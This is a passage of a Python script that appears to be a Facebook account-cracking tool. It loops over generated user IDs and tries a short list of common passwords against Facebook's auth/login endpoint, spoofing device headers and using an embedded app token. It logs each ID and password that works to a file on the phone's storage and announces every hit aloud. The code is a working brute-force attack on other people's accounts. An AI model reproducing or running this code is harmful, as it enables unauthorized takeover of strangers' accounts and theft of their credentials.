		clear();tl=str(len(user))
		print(f'{xd} TOTAL LIMIT {bx}:{wx} {tl} ');print (f'{xd} FLIGHT MODE {wx}ON{bx}|{wx}OFF{gx} EVERY {wx}3{gx} MINUTES ');linex()
		for lover in user:
			ids = ___B_A_L___ + lover
			passlist = ["123456","1234567","12345678","123456789","123123","143143","1234567890","112233"]
			____D_O_N____.submit(___M_T_D_X___,ids,passlist)
	linex();print(f"\n{wx}{47*'-'}");print(f'{xd} THE PROCESS HAS COMPLETED');print(f'{xd} TOTAL OK UID {bx}:{gx} ' + str(len(oks)));print(f"\n{wx}{47*'-'}");exit()

#------------->> OLD METHOD M1 >>-------------#
def ___M_T_D_X___(ids,passlist):
    global loop,oks,cps,twf
    xp=f"{bx}[{gx}MR{bx}]{gx}"
    sys.stdout.write(f'\r\r{xp}-\x1b[1;90m[\033[1;32mGEN\x1b[1;90m] \033[1;37m%s\x1b[1;90m|\033[1;37mOK:-\033[1;32m%s\x1b[1;90m|\033[1;37mCP:-\x1b[38;5;205m%s\x1b[1;90m|\033[1;37m2FA:-\x1b[38;5;214m%s '%(loop,len(oks),len(cps),len(twf)));sys.stdout.flush()
    ua = get_ua()
    try:
        for pas in passlist:
            data = {'adid':str(uuid.uuid4()),'email':ids,'password':pas,'cpl':'true','credentials_type':'device_based_login_password',"source": "device_based_login",'error_detail_type':'button_with_disabled','format':'json','generate_session_cookies':'1','generate_analytics_claim':'1','generate_machine_id':'1',"family_device_id": str(uuid.uuid4()),"advertiser_id": str(uuid.uuid4()),"locale":"en_US","client_country_code":"US","device_id": str(uuid.uuid4()),"method": "auth.login","api_key": "882a8490361da98702bf97a021ddc14d","fb_api_req_friendly_name": "authenticate","fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
            head = {'content-type':'application/x-www-form-urlencoded','Host': 'graph.facebook.com','x-fb-sim-hni':str(random.randint(20000,40000)),'X-FB-Connection-Type': 'WIFI','Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32','user-agent':ua,'x-fb-net-hni':str(random.randint(20000,40000)),'x-fb-device-group': '5120','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62','x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),'x-fb-connection-quality':'EXCELLENT','X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True','x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','x-fb-friendly-name':'ViewerReactionsMutation','X-FB-Request-Analytics-Tags': 'graphservice','accept-encoding':'gzip, deflate','x-fb-http-engine':'Liger'};url = "https://graph.facebook.com/auth/login"
            response = requests.post(url,data=data,headers=head,verify=True).json()
            if "access_token" in response:
                uid = response['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-OLD-OK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                oks.append(str(uid))
                break
            elif "www.facebook.com" in response.get("error", {}).get("message", ""):
                uid = response['error']['error_data']['uid']
                year = tutulx(str(uid))
                print(f'\r\r\x1b[1;90m[\033[1;32mGEN-OK\x1b[1;90m]\033[1;32m {uid} | {pas}\033[1;97m \x1b[1;90m•> \x1b[1;92m{year}')
                os.system('espeak -a 300 "GEN,  Ok,  id"')
                open('/sdcard/GEN-OLD-OK-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                oks.append(str(uid))
                break
            else:continue
        loop += 1
    except Exception as e:pass

#------------->> END SCRIPT >>-------------#
# Start the key authentication
On()